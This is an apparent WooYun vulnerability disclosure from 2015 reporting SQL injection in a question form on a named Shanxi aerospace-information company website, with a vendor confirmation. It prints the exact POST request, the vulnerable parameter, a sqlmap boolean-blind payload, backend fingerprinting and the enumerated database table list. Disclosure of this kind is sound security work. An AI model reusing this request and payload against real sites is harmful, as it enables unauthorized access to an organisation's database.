wybug_title: 山西航天信息某站sql注入一枚
wybug_detail:
漏洞详情 披露状态：   									2015-09-29：	细节已通知厂商并且等待厂商处理中									2015-09-30：	厂商已经确认，细节仅向厂商公开									2015-10-10：	细节向核心白帽子及相关领域专家公开									2015-10-20：	细节向普通白帽子公开									2015-10-30：	细节向实习白帽子公开									2015-11-14：	细节向公众公开  简要描述： 你懂得 详细说明：  
POST /serve_qustion.asp?sType=qustion HTTP/1.1Host: www.sxhtjs.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Referer: http://www.sxhtjs.com.cn/serve_qustion.asp?sType=qustionCookie: ASPSESSIONIDCCCBSQDR=BEDBKGOAEAKOONBJNJFFCHPHConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 12wtms=a&cplx=
参数 wtms   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: wtms (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: wtms=a%' AND 2242=2242 AND '%'='&cplx=---[18:34:11] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Oracle盲注一枚current schema (equivalent to database on Oracle):    'SUPPORT'Database: SUPPORT[36 tables]+------------------+| ARTICLE          || ARTICLE_CONTENT  || COUNT_IP         || DATA_FWPJ        || DATA_WZ_XW       || DM_CP            || DM_LM            || DM_LX            || DM_MX            || DM_SYSQ          || DM_SYS_ORG       || DM_SYS_TAX       || DM_YXQQ          || J_JOBLIST        || KFZX_GZBX        || KFZX_WSBM        || PRODUCT          || PRODUCT_CLASS    || SOFT_DOWN        || SUP_WTK          || SUP_WTK_20140326 || SUP_WTK_BAK      || SYS_LOG          || SYS_ORG          || SYS_RES          || SYS_ROLE         || SYS_ROLE_RES     || SYS_USER_UPDATE  || TEMP_A           || WH_JBZL          || YP_GZCG          || YP_GZJL          || YP_JTQK          || YP_JYQK          || YP_RYXX          || YP_ZYZG          |+------------------+   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-09-30 09:16 厂商回复： 已确认，正在紧急联系技术人员处理。 最新状态： 暂无
